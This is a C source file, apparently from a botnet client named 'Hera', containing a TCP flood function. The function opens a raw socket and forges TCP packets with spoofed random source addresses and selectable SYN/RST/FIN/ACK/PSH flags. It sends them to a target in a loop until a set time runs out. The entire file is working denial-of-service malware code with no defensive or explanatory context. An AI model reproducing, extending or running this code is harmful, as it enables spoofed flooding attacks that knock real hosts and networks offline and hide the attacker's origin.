#include "../../includes/px_botnet.h"

// Hera Client.c
void TCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval, int spoofit)
{
	register unsigned int pollRegister;
	pollRegister = pollinterval;
	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	if (port == 0)
		dest_addr.sin_port = rand_cmwc();
	else
		dest_addr.sin_port = htons(port);
	if (getHost(target, &dest_addr.sin_addr))
		return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (!sockfd)
	{
		return;
	}
	int tmp = 1;
	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
	{
		return;
	}
	in_addr_t netmask;
	if (spoofit == 0)
		netmask = (~((in_addr_t)-1));
	else
		netmask = (~((1 << (32 - spoofit)) - 1));
	unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
	struct iphdr *iph = (struct iphdr *)packet;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
	tcph->source = rand_cmwc();
	tcph->seq = rand_cmwc();
	tcph->ack_seq = 0;
	tcph->doff = 5;
	if (!strcmp(flags, "all"))
	{
		tcph->syn = 1;
		tcph->rst = 1;
		tcph->fin = 1;
		tcph->ack = 1;
		tcph->psh = 1;
	}
	else
	{
		unsigned char *pch = strtok(flags, ",");
		while (pch)
		{
			if (!strcmp(pch, "syn"))
			{
				tcph->syn = 1;
			}
			else if (!strcmp(pch, "rst"))
			{
				tcph->rst = 1;
			}
			else if (!strcmp(pch, "fin"))
			{
				tcph->fin = 1;
			}
			else if (!strcmp(pch, "ack"))
			{
				tcph->ack = 1;
			}
			else if (!strcmp(pch, "psh"))
			{
				tcph->psh = 1;
			}
			else
			{
			}
			pch = strtok(NULL, ",");
		}
	}
	tcph->window = rand_cmwc();
	tcph->check = 0;
	tcph->urg_ptr = 0;
	tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
	tcph->check = tcpcsum(iph, tcph);
	iph->check = csum((unsigned short *)packet, iph->tot_len);
	int end = time(NULL) + timeEnd;
	register unsigned int i = 0;
	while (1)
	{
		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
		iph->saddr = htonl(getRandomIP(netmask));
		iph->id = rand_cmwc();
		tcph->seq = rand_cmwc();
		tcph->source = rand_cmwc();
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		iph->check = csum((unsigned short *)packet, iph->tot_len);
		if (i == pollRegister)
		{
			if (time(NULL) > end)
				break;
			i = 0;
			continue;
		}
		i++;
	}
}